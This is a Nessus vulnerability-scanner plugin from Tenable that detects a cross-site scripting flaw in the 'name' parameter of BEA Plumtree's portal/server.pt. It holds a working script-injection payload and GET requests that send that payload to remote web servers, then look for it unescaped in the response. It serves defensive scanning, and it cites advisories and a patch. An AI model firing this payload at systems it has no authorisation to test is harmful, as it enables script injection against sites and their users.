#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(31120);
  script_version("$Revision: 1.5 $");
  script_bugtraq_id(27893);
  script_xref(name:"OSVDB", value:"41882");

  script_name(english:"BEA Plumtree portal/server.pt name Parameter XSS");
  script_summary(english:"Tries to inject script code into ");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains an application affected by a cross-site
scripting vulnerability." );
 script_set_attribute(attribute:"description", value:
"The version of the Plumtree portal included with BEA AquaLogic
Interaction / Plumtree Foundation and installed on the remote host
fails to sanitize user-supplied input to the 'name' parameter of the
'portal/server.pt' script before using it to generate dynamic HTML
output.  An unauthenticated attacker can exploit this to inject
arbitrary HTML and script code into a user's browser to be executed
within the security context of the affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.procheckup.com/Vulnerability_PR06-12.php" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/488346" );
 script_set_attribute(attribute:"see_also", value:"http://dev2dev.bea.com/pub/advisory/259" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch as suggested in the vendor advisory above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded: 0);


exploit = string('";}</script>', "<script>alert('", SCRIPT_NAME, "')</script>");


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/portal", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Inject some script code.
  r = http_send_recv3(method:"GET", 
    item:string(
      dir, "/server.pt?",
      "open=space&",
      "name=", urlencode(str:exploit)
    ),
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we see our exploit in the results.
  if (
    "function OpenerAS_GetParentSpaceName()" >< res &&
    string('return "', exploit, '";') >< res
  )
  {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
